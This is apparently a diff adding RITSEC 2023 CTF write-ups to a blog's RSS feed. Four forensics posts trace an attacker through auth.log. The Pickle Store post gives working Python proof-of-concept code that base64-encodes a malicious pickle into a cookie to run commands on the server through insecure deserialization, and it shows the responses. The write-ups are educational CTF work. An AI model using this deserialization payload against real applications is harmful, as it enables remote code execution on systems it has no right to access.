+&lt;h2 id=&quot;what-happens-next&quot;&gt;What Happens Next&lt;/h2&gt;
+&lt;p&gt;If you look carefully at the log, you’ll notice that after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; exploit is run, the UID goes from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;redteam(1001)/redteam(1001)&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root(0)/root(0)&lt;/code&gt;.  This shows that the exploit worked as intended, and our attackers are able to escalate privledges in the future. 
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-4/escalation.png&quot; alt=&quot;successful escalation in auth.log&quot; title=&quot;Successful escalation in auth.log&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I cannot emphasize enough how much I enjoyed this entire series of challenges.  These were my favorite part of the CTF, as I feel like CTFs are usually centered around attacking when there can be plenty of interesting &lt;em&gt;defending&lt;/em&gt; exercises.  Kudos to the authors!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-4</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-4</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Forensics / Red Team Activity 3</title>
+        <description>&lt;h1 id=&quot;picking-up-where-we-left-off&quot;&gt;Picking Up Where We Left Off&lt;/h1&gt;
+&lt;p&gt;Please see &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;Red Team Activity 1&lt;/a&gt; and &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-2&quot;&gt;Red Team Activity 2&lt;/a&gt; for more context on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, and why we searched for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; commands.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h2&gt;
+&lt;p&gt;This time, we were asked tofind the location of the script that ran &lt;em&gt;repeatedly&lt;/em&gt; (emphasis mine).  On linux, what do you think of when you want to run something over and over in an unattended way?  &lt;a href=&quot;https://en.wikipedia.org/wiki/Cron&quot;&gt;Cron&lt;/a&gt;, of course!&lt;/p&gt;
+
+&lt;h2 id=&quot;our-initial-filter-ftw&quot;&gt;Our Initial Filter FTW&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep 'vim' ttyl.log&quot; title=&quot;grep 'vim' tty.log&quot; /&gt;
+I kind of feel bad leaving this post so short, but… if you already understand cron, you’ll know that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/spool/cron/crontabs/root&lt;/code&gt; is the root user’s crontab, which is how crons are scheduled in Linux.  This is the answer, and we can move on to number 4!&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Again, our initial filtering and a little knowledge of how Linux works is helping us breeze through these challenges.  In my conclusion for &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-2&quot;&gt;Red Team Activity 2’s Writeup&lt;/a&gt;, I mentioned that you could see the red teamers adding persistence and doing other things.  Start to think about how you may want to go about preserving evidence on this server while also neutralizing the red team’s ability to access or execute scripts.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-3</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-3</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Forensics / Red Team Activity 2</title>
+        <description>&lt;h1 id=&quot;picking-up-where-we-left-off&quot;&gt;Picking Up Where We Left Off&lt;/h1&gt;
+&lt;p&gt;In &lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;Red Team Activity 1&lt;/a&gt;, we filtered the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; down to only commands run from a TTY, and then found all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; commands that were run.  This writeup will reference &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, which was created in the previous exercise by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -v 'tty:(none)' auth.log &amp;gt; tty.log&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h2&gt;
+&lt;p&gt;We were asked to find the name of the malicious service.  Looking at our screenshot of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt; entries from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt;, we can actually see that a service called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bluetoothd.service&lt;/code&gt; was touched.  If this is a server and not a desktop, I’m not sure why we would ever want a bluetooth service running… This seems sus.
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep 'vim' ttyl.log&quot; title=&quot;grep 'vim' tty.log&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;looking-further-into-it&quot;&gt;Looking further into it&lt;/h2&gt;
+&lt;p&gt;So we know that there’s probably more context around that entry.  Let’s find the entry in the full &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; to see what was going on around that time:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -n 'bluetoothd.service' auth.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;In the above command, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; flag tells grep to provide the line number.  We can see that the entries are on lines 252 and 253 of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt;.  With this information, we can open the file in your favorite editor/reader/whatever you want to use and skip to that line number.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-else-is-going-on-here&quot;&gt;What else is going on here?&lt;/h2&gt;
+&lt;p&gt;Well, the attackers add the service and then enable it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemctl&lt;/code&gt;, and then look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; file to see if their activity is being recorded.  Their very next move is to instapp apache2, which is a bit odd.  We don’t see any logout inbetween, and the command is using the same TTY.  This is interesting, and we may want to remember that for later.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I enjoy that these challenges are really continuations of the previous challenge.  Additionally, if you’re filtering in a smart way, they become way easier to pinpoint the attacks and what the red-teamers did.  As an exercise for fun, you could look for other interesting commands such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adduser&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd&lt;/code&gt; to see if they are creating a user for persistence, or maybe even &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-2</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-2</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Forensics / Red Team Activity 1</title>
+        <description>&lt;h1 id=&quot;digging-through-logs&quot;&gt;Digging Through Logs&lt;/h1&gt;
+&lt;p&gt;If you’re reading this, you already know I’m a nerd. If that point wasn’t already clear enough, let me tell you how excited I was about challenges that have you digging through server logs to piece together what could have happened!  Even better, it was from a Linux server, so this was kind of up my alley. Having spent quite some time as a blue-teamer, I was pretty confident going into this.  Hopefully some of thet tips and tricks I share here can help you in the future!&lt;/p&gt;
+
+&lt;h1 id=&quot;authlog&quot;&gt;Auth.log&lt;/h1&gt;
+&lt;p&gt;We are given an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; file, and asked to give the name of the script that was dropped on the server.  Let’s tear into it! The log file is 13,647 lines long, so either there’s a ton of activity on the server, or this is more of a syslog than a traditional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth.log&lt;/code&gt; file.
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/auth-log-lines.png&quot; alt=&quot;wc -l auth.log&quot; title=&quot;wc -l auth.log&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;filtering-out-the-noise&quot;&gt;Filtering out the Noise&lt;/h2&gt;
+&lt;p&gt;There’s a lot of noise in this file.  There’s plenty of things that are just typical behavior on an Ubuntu machine.  In order to find out what’s going on here, we need to filter some of that noise out.  I’ve played a fair amount of &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;HackTheBox&lt;/a&gt;, and I know that as a red-teamer, I’d want to be working on a proper TTY. Let’s see if we can limit the file down to only the entires that were done from a TTY:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -v 'tty:(none)' auth.log &amp;gt; tty.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The above command uses grep to filter OUT the lines that have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty:(none)&lt;/code&gt; in them, leaving us with only logs from where a proper TTY was used.  This file is now only 771 lines long, which is a lot better than 13k!
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/tty-log-lines.png&quot; alt=&quot;wc -l tty.log&quot; title=&quot;wc -l tty.log&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;what-would-i-do&quot;&gt;What Would I Do?&lt;/h2&gt;
+&lt;p&gt;While our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tty.log&lt;/code&gt; file is significantly smaller, we can make some educated guesses on how a script was dropped.  Starting out, I decided to focus in on the following commands:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;curl&lt;/li&gt;
+  &lt;li&gt;wget&lt;/li&gt;
+  &lt;li&gt;vim&lt;/li&gt;
+  &lt;li&gt;vi&lt;/li&gt;
+  &lt;li&gt;nano
+Why these commands?  They’re how I would go about getting a script onto a linux machine.  It will either be downloaded or manually added to the machine.  I ran the following and looked at the lines for each, until I found what I was looking for when searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vim&lt;/code&gt;:
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/red-team-activity-1/grep-vim-tty-log.png&quot; alt=&quot;grep 'vim' ttyl.log&quot; title=&quot;grep 'vim' tty.log&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;what-did-we-just-find&quot;&gt;What Did We Just Find?&lt;/h2&gt;
+&lt;p&gt;Well, interestingly enough, we actually found the answers to at least two other challenges here. but we can see that someone created a script in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm/_script2980.sh&lt;/code&gt;.  That certainally seems a bit odd, and is probably what we’re looking for.  I did a MD5sum of the name of the script and plugged it into the flag format, and boom!  Another flag down.  Let’s look at the other red team activity challenges now.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I loved this challenge, as it showcases why off-site logging is so important.  If you look carefully at the above screenshot, you can actually see that the attacker &lt;strong&gt;edited&lt;/strong&gt; auth.log.  In theory, if the logs are only stored locally, they could have erased their tracks and incident responders would have even less data to work with.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/forensics/red-team-activity-1</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/forensics/red-team-activity-1</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Web / Pickle Store</title>
+        <description>&lt;h1 id=&quot;the-challenge&quot;&gt;The Challenge&lt;/h1&gt;
+&lt;p&gt;You are led to a website that has a bunch of pickles for sale.  Clicking on a pickle brings you to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/order&lt;/code&gt; page, where it tells you your order.  This one was released well after the start of CTF, and I had already done the &lt;a href=&quot;/blog/ritsec-ctf-2023/web/x-men-lore&quot;&gt;X-Men Lore challenge&lt;/a&gt;, and it seemed &lt;em&gt;very&lt;/em&gt; familiar.&lt;/p&gt;
+
+&lt;h2 id=&quot;cookies-on-click&quot;&gt;Cookies On Click&lt;/h2&gt;
+&lt;p&gt;Similar to how the x-men challenge worked, the buttons were embedded into a link, but also had an on-click handler that set a cookie.  The full onclick function for “Sweet Pickle” is&lt;/p&gt;
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;order=gASVDwAAAAAAAACMC3N3ZWV0cGlja2xllC4=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That looks like some base64 if I’ve ever seen it!  Pro-tip from future leo: Don’t rely on the chrome dev tools or even the terminal, as there could be some extra un-readable characters in the data.  Given this has the name “Pickle” in the title, and we know it’s a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gunicorn&lt;/code&gt; server (inspect the response headers for the website), we already know it’s a python deserialization exercise.  Python pickles are binary data, not strings.  I wasted a bit of time here.&lt;/p&gt;
+
+&lt;h2 id=&quot;creating-a-payload&quot;&gt;Creating a Payload&lt;/h2&gt;
+&lt;p&gt;Like any great security researcher, I googled “python pickle exploit” and copy/pasted the code.  I would then create a pickle from my exploit, and then base64 encode it.  My PoC code looked like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://pickles-web.challenges.ctf.ritsec.club/order'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the response:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Pickle Store&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/style.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Here's your order!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;0&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'button'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;New Order&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;not-quite-there&quot;&gt;Not Quite There&lt;/h2&gt;
+&lt;p&gt;We know that we proved it was vulnerable to a pickle deserialization attack, but we aren’t really able to do a lot with the output from our payload.  I spent a little time enumerating what was causing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; where the name should be, and finally realized that’s the response code from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.system&lt;/code&gt; call.  We don’t want the response code, we want actual output.  More googling and a little refactoring later, I had the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;return &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://pickles-web.challenges.ctf.ritsec.club/order'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'order'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SweetPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Which then returned:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Pickle Store&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/style.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Here's your order!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
